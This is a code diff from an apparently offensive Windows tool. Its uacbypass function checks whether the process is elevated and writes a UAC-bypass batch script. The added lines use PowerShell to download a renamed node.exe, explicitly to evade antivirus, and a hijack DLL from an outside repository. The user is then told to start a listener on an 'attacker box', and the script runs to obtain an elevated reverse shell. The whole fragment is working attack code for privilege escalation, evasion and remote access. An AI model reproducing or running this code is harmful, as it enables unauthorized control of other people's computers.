@@ -735,17 +735,15 @@ void uacbypass()
     DWORD procintegrity=CheckProcessIntegrity(GetCurrentProcessId());
     if (procintegrity != 0x3000)
     {
-        printf("current process is NOT elevated...time to work some magic!\n");
+        printf("[+] current process is NOT elevated...time to work some magic!\n");
     }
     else
     {
-        printf("already elevated!\n");
+        printf("[!] already elevated!\n");
         exit(0);
     }
     
-    printf("Downloading node.exe portable binary to use for reverse shell and to help stay under the radar from AV (takes ~2 min to download);)\n");
-    //WinExec("powershell Invoke-WebRequest -Uri \"https://nodejs.org/download/release/latest/win-x64/node.exe\" -OutFile \"c:\\users\\public\\n0de.exe\"", 0); //download directly from nodejs file repo
-    
+   
     
     cout << "generating rev shell payload now...\n";
     string revip, portnum;
@@ -787,7 +785,15 @@ void uacbypass()
     uacbyppayload << "rmdir \"C:\\Windows \\\"\n";
     uacbyppayload.close();
     cout << "uac byp@ss script created! It's located at: C:\\users\\public\\elevateit.bat\n";
-
+    cout << "Downloading necessary scripts...\n";
+    printf("Downloading node.exe portable binary to use for reverse shell and to help stay under the radar from AV detection (takes ~2 min to download);)\n");
+    WinExec("powershell Invoke-WebRequest -Uri \"https://nodejs.org/download/release/latest/win-x64/node.exe\" -OutFile \"c:\\users\\public\\n0de.exe\"", 0); //download directly from nodejs file repo
+    WinExec("powershell Invoke-WebRequest -Uri \"https://github.com/g3tsyst3m/elevationstation/raw/main/uacbypass_files/netutils.dll\" -OutFile \"c:\\temp\\netutils.dll\"", 0); //UAC byp@ss DLL, downloaded directly from the elevationstation repo folder
+    cout << "wait for everything to finish downloading before hitting [enter]\n";
+    cin.get();
+        cout << "Start your listener on your attacker box now and then hit [enter].  You should be greeted by an elevated shell!\n";
+    cin.get();
+    WinExec("c:\\users\\public\\elevateit.bat", 0);
 
 }
 
